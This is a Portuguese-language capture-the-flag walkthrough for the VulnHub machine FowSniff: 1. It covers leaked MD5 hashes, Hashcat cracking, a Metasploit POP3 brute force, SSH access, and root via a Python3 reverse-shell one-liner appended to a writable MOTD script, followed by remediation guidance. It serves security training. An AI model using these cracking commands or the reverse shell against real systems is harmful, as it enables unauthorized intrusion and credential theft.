# FowSniff: 1 — De um Dump no Pastebin ao Root em Oito Passos

Olha rapaziada!! FowSniff: 1 é uma cadeia perfeita de OSINT até root que espelha como violações corporativas reais se desenrolam. Uma busca no Google encontra hashes MD5 vazados no Pastebin, o Hashcat os quebra, o Metasploit faz brute-force no POP3, um e-mail interno vaza uma senha SSH, e um script MOTD gravável executado como root entrega o golpe final. Cada passo aqui é uma tática APT documentada. Essa máquina é top demais, véi.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | FowSniff CTF: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/fowsniff-ctf-1,262/ |
| **Técnicas** | Nmap, OSINT (dump Pastebin), quebra de hash MD5 (Hashcat), brute-force POP3 (Metasploit), vazamento de credencial por e-mail, acesso SSH, injeção de script MOTD gravável |
| **CVEs** | CWE-327 (Algoritmo Criptográfico Quebrado: MD5 para senhas), CWE-732 (Atribuição Incorreta de Permissão: script MOTD gravável), CWE-312 (Armazenamento em Texto Claro: senha SSH em e-mail) |
| **Grupos APT** | APT28: usa bancos de dados de credenciais roubados e pivoting por e-mail para acesso inicial; Lazarus Group: mira dumps de violação de credenciais para movimento lateral; múltiplos operadores de ransomware realizam OSINT contra credenciais vazadas como primeiro passo de reconhecimento |

---

## Resumo do Ataque

```
nmap → SSH/22, HTTP/80, POP3/110, IMAP/143
  → HTTP: página FowSniff Corp, sem conteúdo útil
  → OSINT: Google "fowsniff corp" → Pastebin com hashes MD5 vazados
  → hashcat -m 0 hashes.txt rockyou.txt → 8/9 hashes quebrados
  → Metasploit pop3_login → seina:scoobydoo2
  → nc $ALVO 110 → USER seina / PASS scoobydoo2
  → retr 1 → senha SSH temporária divulgada
  → retr 2 → usuário SSH: baksteen
  → ssh baksteen@$ALVO
  → find / -group users -type f → /opt/cube/cube.sh (gravável)
  → cat /etc/update-motd.d/00-header → executa /opt/cube/cube.sh como root no login
  → anexar Python3 reverse shell ao cube.sh
  → nc -lvnp 1234 no atacante
  → nova sessão SSH → MOTD executa → callback root
  → /root/flag.txt
```

---

## Metodologia

1. Scan completo de portas: SSH, HTTP, POP3, IMAP
2. OSINT: buscar "fowsniff" para encontrar banco de dados de credenciais vazadas no Pastebin
3. Quebrar hashes MD5 offline com Hashcat + rockyou.txt
4. Brute-force de credencial POP3 com Metasploit usando senhas quebradas
5. Ler caixa de e-mail POP3 para extrair credenciais SSH
6. Acesso SSH como baksteen
7. Enumeração de permissão de arquivo por grupo: encontrar arquivos graváveis do grupo users
8. Injeção no script MOTD: anexar Python3 reverse shell, disparar via nova sessão SSH → root

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.29

nmap -A -p- -T4 192.168.1.29
```

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.x
80/tcp  open  http    Apache httpd 2.4.x
110/tcp open  pop3
143/tcp open  imap
```

Quatro serviços. HTTP não tem conteúdo útil após revisão rápida. POP3 é o alvo principal após o OSINT entregar as credenciais.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — OSINT: Banco de Dados de Credenciais Vazadas

Buscar no Google por `"fowsniff corp"` ou simplesmente `"fowsniff"`.

Um post no Pastebin aparece com:
- Endereços de e-mail corporativos dos funcionários: mauer, tiago, bseeley, csnorthcott, parede, btanaka, shodsworth, dcoast, seina
- Hashes MD5 de senha para cada conta

Salvar todos os hashes em um arquivo:

```bash
cat > /tmp/fowsniff_hashes.txt << 'EOF'
8a28a2a936d4f5b9571e0445f888b520
e2b4a89f1ae0303b8e3e71f63d82df2c
...
EOF
```

**Nota do mundo real:** Bancos de dados de credenciais aparecem no Pastebin, GitHub, sites paste da darkweb e serviços de notificação de violação (HaveIBeenPwned) constantemente. Atores de ameaça profissionais mantêm scrapers automatizados que coletam credenciais vazadas e as tentam contra serviços corporativos dentro de horas após o dump aparecer.

**MITRE ATT&CK:** T1598 — Phishing para Informação; T1589 — Coleta de Informações de Identidade da Vítima

---

## Passo 3 — Quebra de Hash: Hashcat + rockyou.txt

Hashes MD5 (`-m 0`) quebram rapidamente com aceleração GPU e rockyou.txt:

```bash
hashcat -m 0 /tmp/fowsniff_hashes.txt /usr/share/wordlists/rockyou.txt \
  -d 1 -w 3 -O \
  --potfile-path /tmp/fowsniff.potfile

hashcat -m 0 /tmp/fowsniff_hashes.txt --show --potfile-path /tmp/fowsniff.potfile
```

Oito de nove hashes quebrados. Construir listas de credenciais:

Exemplo de pares quebrados:

| E-mail | Senha Quebrada |
|---|---|
| seina@fowsniff.org | scoobydoo2 |
| bseeley@fowsniff.org | regal |
| tiago@fowsniff.org | blahblah |
| mauer@fowsniff.org | ilovemovies |
| csnorthcott@fowsniff.org | nancydrewrules |

**Nota do mundo real:** MD5 para armazenamento de senha é CWE-327. Foi considerado inseguro para senhas desde pelo menos 2010. NIST SP 800-132 determina funções de hash de senha memory-hard (bcrypt, scrypt, Argon2). Uma GPU pode testar bilhões de hashes MD5 por segundo.

**MITRE ATT&CK:** T1110.002 — Força Bruta: Quebra de Senha

---

## Passo 4 — Brute-Force POP3 com Metasploit

```bash
msfconsole -q
msf> use auxiliary/scanner/pop3/pop3_login
msf> set RHOSTS 192.168.1.29
msf> set USER_FILE /tmp/user.txt
msf> set PASS_FILE /tmp/pass.txt
msf> set VERBOSE false
msf> run
```

**Encontrado:** `seina` / `scoobydoo2`

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha

---

## Passo 5 — Ler Caixa de E-mail POP3

Conectar diretamente ao POP3 com netcat:

```bash
nc 192.168.1.29 110
+OK fowsniff POP3 server (Dovecot)
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
LIST
RETR 1
```

**Mensagem 1** (de stone): Contém senha SSH temporária definida pelo admin.

```
Senha SSH: S1ck3nBluff+secureshell
```

```
RETR 2
```

**Mensagem 2** (dica): Identifica `baksteen` como o usuário SSH alvo.

**Nota do mundo real:** Servidores de e-mail expondo POP3 sem TLS obrigatório e sem restrição de IP permitem que qualquer atacante com credencial válida leia todas as mensagens dessa conta. Comunicações internas sobre senhas, credenciais e acesso ao sistema são frequentemente divulgadas dessa forma.

**MITRE ATT&CK:** T1114.002 — Coleta de E-mail: Coleta Remota de E-mail

---

## Passo 6 — Acesso SSH

```bash
ssh baksteen@192.168.1.29
# Senha: S1ck3nBluff+secureshell
```

Shell como baksteen. Enumerar o sistema.

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH

---

## Passo 7 — Enumeração de Escalação de Privilégio

Verificar grupos e encontrar arquivos graváveis pelo grupo `users`:

```bash
id
# uid=1004(baksteen) gid=100(users) groups=100(users)

find / -group users -type f 2>/dev/null
# /opt/cube/cube.sh

cat /etc/update-motd.d/00-header
# #!/bin/sh
# ...
# /opt/cube/cube.sh
```

O script MOTD executa `cube.sh` como **root** em cada login SSH. O grupo `users` tem permissão de escrita no `cube.sh`. Baksteen está no grupo `users`. gg.

**Nota do mundo real:** Scripts MOTD, hooks PAM e scripts de login executados como root com permissões de escrita por grupo são um achado consistente de escalação de privilégio. APT41 especificamente mira scripts de login-hook para persistência e escalação de privilégio.

**MITRE ATT&CK:** T1037 — Scripts de Inicialização de Boot ou Logon; T1574 — Sequestro de Fluxo de Execução

---

## Passo 8 — Injeção MOTD: Shell Root

No atacante, iniciar listener:

```bash
nc -lvnp 1234
```

No alvo, anexar Python3 reverse shell ao cube.sh:

```bash
echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.X\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" >> /opt/cube/cube.sh
```

Disparar MOTD abrindo nova sessão SSH:

```bash
ssh baksteen@192.168.1.29
```

A execução MOTD aciona o cube.sh como root. O callback da reverse shell chega:

```bash
# No listener:
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
```

Root capturado. Perfeito!

**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos: Unix Shell; T1548.003 — Abuso de Controle de Elevação: Sudo/MOTD

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Usado Para |
|---|---|---|---|
| Dump de violação | 9x hashes MD5 | OSINT Pastebin | Hashcat rockyou.txt → 8 quebrados |
| Credencial | seina:scoobydoo2 | Hashcat + Metasploit pop3\_login | Acesso caixa de e-mail POP3 |
| Credencial | baksteen:S1ck3nBluff+secureshell | E-mail POP3 (Mensagem 1) | Login SSH |
| Acesso root | via injeção MOTD cube.sh | /opt/cube/cube.sh escrita | Python3 reverse shell → uid=0 |
| Flag root | flag.txt | /root/flag.txt | Capturada |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Conclusão |
|---|---|---|---|
| 1 | Hashes MD5 vazados no Pastebin | Bancos de dados de credenciais são rotineiramente dumpados e buscados por atores de ameaça em horas; MD5 é trivialmente quebrável | Monitorar exposição de credenciais (API HaveIBeenPwned); migrar para bcrypt/Argon2 imediatamente |
| 2 | POP3 sem TLS expõe comunicações internas | Servidores de e-mail expondo POP3 sem criptografia obrigatória permitem leitura de caixa de correio com credencial | Desabilitar POP3 em texto claro; aplicar IMAPS (993); adicionar restrições de IP |
| 3 | Senha SSH transmitida via e-mail | E-mail não é canal seguro para distribuição de credenciais | Distribuir chaves SSH via PAM, SSH CA ou gerenciador de segredos; nunca enviar senhas por e-mail |
| 4 | Script MOTD gravável por grupo não-root e executado como root | Scripts de login executados como root com permissões de escrita por grupo são backdoors root | Definir scripts MOTD como root:root modo 0755; auditar todos os arquivos /etc/update-motd.d/ |
| 5 | Reutilização de credencial entre POP3 e SSH | Senha POP3 quebrada diretamente revela senha SSH via e-mail | Aplicar senhas únicas por serviço; usar gerenciador de senhas |

---

## MITRE ATT&CK

| Fase | Tática | Técnica | ID |
|---|---|---|---|
| Reconhecimento | Reconhecimento | Coleta de Informações de Identidade da Vítima | T1589 |
| Reconhecimento | Reconhecimento | Phishing para Informação | T1598 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha | T1110.002 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Adivinhação de Senha (POP3) | T1110.001 |
| Coleta | Coleta | Coleta de E-mail: Coleta Remota de E-mail | T1114.002 |
| Acesso Inicial | Acesso Inicial | Contas Válidas (SSH) | T1078 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Escalação de Privilégio | Escalação de Privilégio | Scripts de Inicialização de Boot ou Logon | T1037 |
| Escalação de Privilégio | Escalação de Privilégio | Sequestro de Fluxo de Execução | T1574 |
| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Substituir MD5 por bcrypt ou Argon2** — hash MD5 de senha está quebrado; migrar para hash adaptativo moderno imediatamente
2. **Desabilitar POP3 em texto claro; aplicar IMAPS** — exigir TLS para todo acesso por protocolo de e-mail; desabilitar porta 110
3. **Monitorar exposição de credenciais** — assinar notificações HaveIBeenPwned; habilitar serviços de monitoramento de violação
4. **Restringir scripts MOTD à propriedade root** — `chown root:root /opt/cube/cube.sh; chmod 755 /opt/cube/cube.sh`; auditar todos os /etc/update-motd.d/
5. **Nunca enviar senhas por e-mail** — usar pares de chave SSH; distribuir via PAM, SSH CA ou gerenciador de segredos

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todos os serviços de e-mail; auditar exposição POP3/IMAP |
| Proteger | Segurança de Dados | Migrar hash de senha para bcrypt/Argon2; aplicar TLS para e-mail |
| Proteger | Controle de Acesso | Restringir scripts MOTD à propriedade root; aplicar auth SSH apenas por chave |
| Detectar | Anomalias e Eventos | Monitorar exposição de credenciais em sites paste; alertar em callbacks de reverse shell |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais expostas imediatamente; corrigir permissões MOTD |
| Recuperar | Planejamento de Recuperação | Reconstruir host comprometido; auditar todos os scripts de login |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Controle de Acesso | Restringir escrita em scripts MOTD ao root; bloquear POP3 em texto claro |
| IA-5 | Gerenciamento de Autenticadores | Migrar para bcrypt; rotacionar todas as credenciais comprometidas |
| SC-8 | Confidencialidade na Transmissão | Aplicar TLS para todos os protocolos de e-mail; desabilitar POP3/IMAP em texto claro |
| SC-28 | Proteção de Informação em Repouso | Sem senhas em e-mail; armazenamento criptografado de credenciais |
| CM-6 | Definições de Configuração | Auditar todos os scripts de login; restringir permissões do diretório MOTD |
| SI-12 | Gerenciamento de Informação | Monitorar exposição de credenciais organizacionais em bancos de dados de violação |

### CISA KEV

Exposição de violação de credenciais e vulnerabilidades de hash MD5 de senha mapeiam para padrões no CISA Alert AA22-074A. CISA aconselha organizações a implementar monitoramento de violação e migrar imediatamente do MD5 para armazenamento de senha.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL2 |
| Consciência Situacional (SITUATION) | Realizar Logging | MIL2 |

### MITRE D3FEND

- **D3-OE** — Prevenção de Execução de Executável do SO (restringir execução de script MOTD)
- **D3-ACH** — Hardening de Configuração de Aplicação (TLS para POP3; bcrypt para senhas)
- **D3-MH** — Hardening de Mensagem (aplicação TLS para protocolos de e-mail)

---

## Considerações Finais

Mano, FowSniff: 1 espelha perfeitamente a metodologia de violação do mundo real. OSINT, quebra de credencial, pivoting por e-mail e injeção MOTD para fechar. Cada técnica aqui está documentada nos playbooks reais de atores de ameaça. A máquina ensina o pensamento OSINT-primeiro: antes de tocar uma porta, busque o que a organização alvo já vazou. A injeção MOTD é um lembrete lindo de que escalação de privilégio nem sempre é sobre exploits de kernel. Às vezes é só um script gravável rodando como root. Subestimada, mas essa é uma das melhores máquinas iniciantes para modelagem de ameaças do mundo real. Top demais!

Thanks guys!! (❍ᴥ❍ʋ)
